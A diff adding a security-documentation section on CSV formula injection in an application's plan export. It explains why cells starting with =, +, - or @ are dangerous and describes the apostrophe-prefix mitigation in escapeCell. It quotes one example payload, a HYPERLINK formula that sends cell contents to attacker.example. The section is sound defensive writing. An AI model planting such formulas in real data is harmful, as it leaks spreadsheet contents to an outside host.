@@ -177,6 +177,35 @@ server.error.include-message: never
 Actuator exposes `health` and nothing else. The other endpoints publish
 configuration, beans and environment variables.
 
+### CSV export, and formula injection
+
+The CSV export is an output path with a genuine injection surface, and it is
+worth being explicit about because it does not look like one.
+
+A cell whose text begins with `=`, `+`, `-` or `@` is a **formula** to Excel,
+Google Sheets and LibreOffice alike. So a task titled
+
+```
+=HYPERLINK("https://attacker.example/?d="&A1&A2,"Click for the report")
+```
+
+is inert everywhere in this application — Angular escapes it, the schedule
+shows it as text — and becomes executable the moment somebody exports the plan
+and opens the file. The route runs from data one project member can type to a
+spreadsheet another member opens on their own machine, which is the part that
+makes it worth defending rather than shrugging at.
+
+`escapeCell` in `core/export.ts` prefixes any such value with an apostrophe,
+the mitigation those three applications all understand as "the rest is text".
+Numbers never pass through it, so a negative figure stays a number. RFC 4180
+quoting is applied on top and separately: quoting alone is *not* a defence,
+because a spreadsheet strips the CSV quoting before it decides what the cell
+means.
+
+The file is written in the browser from data the caller already has, so this
+adds no new access — the concern is entirely about what happens to it after it
+is saved. `export.spec.ts` pins all four prefixes.
+
 ---
 
 ## CSRF, CORS, rate limiting
